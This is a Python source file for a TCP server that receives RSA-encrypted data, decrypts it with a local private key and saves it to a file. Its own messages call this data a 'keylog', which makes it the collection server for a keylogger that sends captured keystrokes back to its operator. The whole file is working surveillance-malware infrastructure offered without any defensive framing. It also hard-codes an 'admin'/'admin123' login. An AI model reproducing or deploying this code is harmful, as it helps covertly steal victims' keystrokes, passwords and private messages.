import socket
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes


# Load the private key for decryption
def load_private_key():
    with open("private_key.pem", "rb") as key_file:
        private_key = serialization.load_pem_private_key(key_file.read(), password=None)
    return private_key


# Decrypt data using RSA private key
def decrypt_data(private_key, encrypted_message):
    decrypted = private_key.decrypt(
        encrypted_message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted.decode('utf-8')


# Access control: check if the user is admin
def authenticate_user():
    username = input("Enter your username: ")
    password = input("Enter your password: ")
    if username == "admin" and password == "admin123":
        return True
    return False


# Set up the TCP server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('10.20.26.134', 5005)  # Change to your server's IP
server_socket.bind(server_address)
server_socket.listen(1)

print("Server is listening for TCP connections...")

while True:
    connection, client_address = server_socket.accept()
    try:
        print(f"Connection established with {client_address}")

        # Authenticate user
        if authenticate_user():
            print("User authenticated as admin. Decrypting logs...")
            private_key = load_private_key()

            while True:
                data = connection.recv(256)  # Adjust buffer size if necessary
                if data:
                    try:
                        decrypted_data = decrypt_data(private_key, data)
                        print(f"Decrypted keylog: {decrypted_data}")

                        # Save the decrypted data to a file
                        with open('decrypted_keylogs.txt', 'a') as f:
                            f.write(decrypted_data + '\n')
                    except Exception as e:
                        print(f"Failed to decrypt data: {e}")
                else:
                    break
    finally:
        connection.close()
